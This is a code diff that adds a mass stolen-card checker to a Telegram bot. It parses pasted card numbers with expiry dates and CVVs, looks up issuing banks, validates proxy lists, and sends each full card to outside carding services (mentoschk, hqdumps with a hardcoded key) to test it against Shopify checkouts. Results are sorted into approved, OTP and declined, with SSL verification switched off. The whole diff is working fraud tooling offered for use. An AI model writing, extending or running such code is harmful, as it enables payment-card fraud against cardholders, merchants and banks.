@@ -4,15 +4,285 @@ import re
 import time
 import random
 import threading
+import csv
 from concurrent.futures import ThreadPoolExecutor, as_completed
 import requests
+import urllib3
 from telebot import types
 
+# Disable SSL warnings
+urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
+
+# ============================================================================
+# Helper functions (defined inside handler to avoid external dependencies)
+# ============================================================================
+
+def get_flag_emoji(country_code):
+    """Convert country code to flag emoji"""
+    if not country_code or len(country_code) != 2:
+        return "🇺🇳"
+    return "".join([chr(ord(c.upper()) + 127397) for c in country_code])
+
+def get_bin_info(card_number):
+    """Fetch BIN information from local CSV or antipublic API"""
+    clean_cc = re.sub(r'\D', '', str(card_number))
+    bin_code = clean_cc[:6]
+    # Try local CSV first (if exists)
+    BINS_CSV_FILE = 'bins_all.csv'
+    if os.path.exists(BINS_CSV_FILE):
+        try:
+            with open(BINS_CSV_FILE, 'r', encoding='utf-8', errors='ignore') as f:
+                reader = csv.reader(f)
+                next(reader, None)  # skip header
+                for row in reader:
+                    if len(row) >= 6 and row[0].strip() == bin_code:
+                        return {
+                            'country_name': row[1].strip(),
+                            'country_flag': get_flag_emoji(row[1].strip()),
+                            'brand': row[2].strip(),
+                            'type': row[3].strip(),
+                            'level': row[4].strip(),
+                            'bank': row[5].strip()
+                        }
+        except Exception as e:
+            print(f"BIN CSV error: {e}")
+    # Fallback to antipublic API
+    try:
+        response = requests.get(f"https://bins.antipublic.cc/bins/{bin_code}", timeout=5)
+        if response.status_code == 200:
+            data = response.json()
+            return {
+                'country_name': data.get('country_name', 'Unknown'),
+                'country_flag': data.get('country_flag', '🇺🇳'),
+                'brand': data.get('brand', 'Unknown'),
+                'type': data.get('type', 'Unknown'),
+                'level': data.get('level', 'Unknown'),
+                'bank': data.get('bank', 'Unknown')
+            }
+    except:
+        pass
+    return {
+        'country_name': 'Unknown',
+        'country_flag': '🇺🇳',
+        'bank': 'UNKNOWN',
+        'brand': 'UNKNOWN',
+        'type': 'UNKNOWN',
+        'level': 'UNKNOWN'
+    }
+
+def extract_cards_from_text(text):
+    """Extract cards in format CC|MM|YYYY|CVV from text"""
+    valid_ccs = []
+    text = text.replace(',', '\n').replace(';', '\n')
+    lines = text.split('\n')
+    for line in lines:
+        line = line.strip()
+        if len(line) < 15:
+            continue
+        match = re.search(r'(\d{13,19})[|:/\s](\d{1,2})[|:/\s](\d{2,4})[|:/\s](\d{3,4})', line)
+        if match:
+            cc, mm, yyyy, cvv = match.groups()
+            if len(yyyy) == 2:
+                yyyy = "20" + yyyy
+            mm = mm.zfill(2)
+            if 1 <= int(mm) <= 12:
+                valid_ccs.append(f"{cc}|{mm}|{yyyy}|{cvv}")
+    return list(set(valid_ccs))
+
+def create_progress_bar(processed, total, length=15):
+    """Create a text progress bar"""
+    if total == 0:
+        return ""
+    percent = processed / total
+    filled_length = int(length * percent)
+    return f"<code>{'█' * filled_length}{'░' * (length - filled_length)}</code> {int(percent * 100)}%"
+
+def validate_proxies_strict(proxies, bot, message):
+    """Test proxies and return live ones"""
+    live_proxies = []
+    total = len(proxies)
+    status_msg = bot.reply_to(message, f"🛡️ <b>Verifying {total} Proxies...</b>", parse_mode='HTML')
+    last_ui_update = time.time()
+    checked = 0
+
+    def check(proxy_str):
+        try:
+            parts = proxy_str.split(':')
+            if len(parts) == 2:
+                url = f"http://{parts[0]}:{parts[1]}"
+            elif len(parts) == 4:
+                url = f"http://{parts[2]}:{parts[3]}@{parts[0]}:{parts[1]}"
+            else:
+                return False
+            requests.get("http://httpbin.org/ip", proxies={'http': url, 'https': url}, timeout=5)
+            return True
+        except:
+            return False
+
+    with ThreadPoolExecutor(max_workers=50) as executor:
+        futures = {executor.submit(check, p): p for p in proxies}
+        for future in as_completed(futures):
+            checked += 1
+            if future.result():
+                live_proxies.append(futures[future])
+            if time.time() - last_ui_update > 2:
+                try:
+                    bot.edit_message_text(
+                        f"🛡️ <b>Verifying Proxies</b>\n✅ Live: {len(live_proxies)}\n💀 Dead: {checked - len(live_proxies)}\n📊 {checked}/{total}",
+                        message.chat.id, status_msg.message_id, parse_mode='HTML'
+                    )
+                    last_ui_update = time.time()
+                except:
+                    pass
+    try:
+        bot.delete_message(message.chat.id, status_msg.message_id)
+    except:
+        pass
+    return live_proxies
+
+# ============================================================================
+# Shopify checker with dual API and fallback
+# ============================================================================
+def check_site_shopify_direct(site_url, cc, proxy=None):
+    import urllib.parse
+    import re
+
+    def call_api(api_base):
+        try:
+            clean_site = site_url.rstrip('/')
+            proxy_str = proxy
+            api_proxy = ""
+            if proxy_str:
+                proxy_str = proxy_str.strip()
+                parts = proxy_str.split(':')
+                if len(parts) == 4:
+                    api_proxy = proxy_str
+                elif '@' in proxy_str:
+                    match = re.match(r'(?:http://)?([^:]+):([^@]+)@([^:]+):(\d+)', proxy_str)
+                    if match:
+                        user, password, host, port = match.groups()
+                        api_proxy = f"{host}:{port}:{user}:{password}"
+                elif len(parts) == 2:
+                    api_proxy = proxy_str
+
+            encoded_cc = urllib.parse.quote(cc)
+            encoded_proxy = urllib.parse.quote(api_proxy) if api_proxy else ""
+
+            if api_base == "mentoschk":
+                url = f"http://mentoschk.com/shopify?site={clean_site}&cc={encoded_cc}"
+                if encoded_proxy:
+                    url += f"&proxy={encoded_proxy}"
+            else:  # hqdumps
+                api_key = "techshopify"
+                url = f"https://hqdumps.com/autoshopify/index.php?key={api_key}&url={clean_site}&cc={encoded_cc}"
+                if encoded_proxy:
+                    url += f"&proxy={encoded_proxy}"
+
+            session = requests.Session()
+            session.verify = False
+            headers = {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'}
+            response = session.get(url, headers=headers, timeout=90)
+
+            if response.status_code != 200:
+                print(f"[API] {api_base} returned {response.status_code}")
+                return None
+
+            data = response.json()
+            print(f"[API] {api_base} raw response: {data}")
+
+            if api_base == "mentoschk":
+                return {
+                    'Response': data.get('Response', 'Unknown'),
+                    'Price': str(data.get('Price', '0.00')),
+                    'Gateway': data.get('Gateway', 'Shopify API'),
+                    'Status': data.get('Status', False)
+                }
+            else:
+                resp_text = data.get('Response', 'Unknown')
+                status = False if 'UNABLE' in resp_text.upper() or 'FAILED' in resp_text.upper() else True
+                return {
+                    'Response': resp_text,
+                    'Price': str(data.get('Price', '0.00')),
+                    'Gateway': data.get('Gate', 'Shopify API'),
+                    'Status': status
+                }
+        except Exception as e:
+            print(f"[API] {api_base} exception: {e}")
+            return None
+
+    # Try primary API
+    result = call_api("mentoschk")
+
+    # If primary failed (None) OR returned a non‑successful response, try secondary
+    if result is None:
+        result = call_api("hqdumps")
+    else:
+        # Quick check if it's already a clear success
+        resp_text = result['Response'].upper()
+        approved_keywords = ['THANK YOU', 'ORDER PLACED', 'CONFIRMED', 'SUCCESS', 'INSUFFICIENT FUNDS']
+        approved_otp_keywords = ['3DS', 'ACTION_REQUIRED', 'OTP_REQUIRED', '3D SECURE']
+        if not any(k in resp_text for k in approved_keywords + approved_otp_keywords):
+            # Not a success – try secondary
+            result2 = call_api("hqdumps")
+            if result2 is not None:
+                result = result2
+
+    if result is None:
+        return {
+            'Response': 'Both APIs failed',
+            'status': 'ERROR',
+            'gateway': 'Shopify API',
+            'price': '0.00',
+            'message': 'No response from any API'
+        }
+
+    response_text = result['Response']
+    price = result['Price']
+    gateway = result['Gateway']
+    status_bool = result['Status']
+    response_upper = response_text.upper()
+
+    # Enhanced mapping
+    approved_keywords = ['THANK YOU', 'ORDER PLACED', 'CONFIRMED', 'SUCCESS', 'INSUFFICIENT FUNDS', 'INSUFFICIENT_FUNDS']
+    approved_otp_keywords = ['3DS', 'ACTION_REQUIRED', 'OTP_REQUIRED', '3D SECURE']
+    declined_keywords = ['CARD DECLINED', 'DECLINED', 'EXPIRED_CARD', 'EXPIRED', 'FRAUD', 'SUSPECTED',
+                         'INCORRECT CVC', 'INCORRECT_CVC', 'INCORRECT ZIP', 'INCORRECT_ZIP',
+                         'INCORRECT NUMBER', 'INCORRECT_NUMBER', 'INVALID NUMBER', 'DO NOT HONOR',
+                         'PICKUP', 'LOST CARD', 'STOLEN CARD', 'AMOUNT TOO SMALL', 'AMOUNT_TOO_SMALL']
+    extra_declined = ['SUBMIT REJECTED', 'PAYMENTS_CREDIT_CARD_NUMBER_INVALID_FORMAT',
+                      'PAYMENTS_CREDIT_CARD_VERIFICATION_VALUE_INVALID_FOR_CARD_TYPE',
+                      'PAYMENTS_CREDIT_CARD_SESSION_ID']
+    error_keywords = ['FAILED TO TOKENIZE CARD', 'SITE DEAD', 'GENERIC_ERROR', 'DEAD/TIMEOUT',
+                      'TIMEOUT', 'PROXY', 'UNABLE TO GET PAYMENT TOKEN', 'CART ADD FAILED',
+                      'SUBMIT FAILED', 'RECHECK']
+
+    if any(k in response_upper for k in approved_keywords):
+        status = 'APPROVED'
+    elif any(k in response_upper for k in approved_otp_keywords):
+        status = 'APPROVED_OTP'
+    elif any(k in response_upper for k in declined_keywords + extra_declined):
+        status = 'DECLINED'
+    elif any(k in response_upper for k in error_keywords):
+        status = 'ERROR'
+    else:
+        status = 'ERROR' if status_bool is False else 'DECLINED'
+
+    return {
+        'Response': response_text,
+        'status': status,
+        'gateway': gateway,
+        'price': price,
+        'message': response_text
+    }
+
+# ============================================================================
+# Main handler setup
+# ============================================================================
 def setup_complete_handler(
     bot,
     get_filtered_sites_func,
     proxies_data,
-    check_site_func,
+    check_site_func,           # we will use our internal one, but allow override
     is_valid_response_func,
     process_response_func,
     update_stats_func,
@@ -21,12 +291,7 @@ def setup_complete_handler(
     OWNER_ID,
     DARKS_ID,
     user_proxies_store,
-    USER_PROXIES_FILE,
-    # Additional required functions from app.py
-    extract_cards_from_text,
-    validate_proxies_strict,
-    get_bin_info,
-    create_progress_bar
+    USER_PROXIES_FILE
 ):
     """
     Sets up additional handlers:
@@ -34,6 +299,9 @@ def setup_complete_handler(
       - Proxy management commands for users
       - Mass check callbacks with filter selection
     """
+    # Use internal Shopify checker unless overridden
+    if check_site_func is None:
+        check_site_func = check_site_shopify_direct
 
     # Helper: check if user is allowed
     def user_allowed(uid):
@@ -290,6 +558,7 @@ def setup_complete_handler(
                     update_ui(bot, message.chat.id, status_msg.message_id, processed, total, results)
                     last_update_time = time.time()
 
+        # Save error cards
         error_list = [f"{res['cc']} : {res['response']}" for res in results['error']]
         if error_list:
             error_file = f"error_cards_{message.from_user.id}.txt"
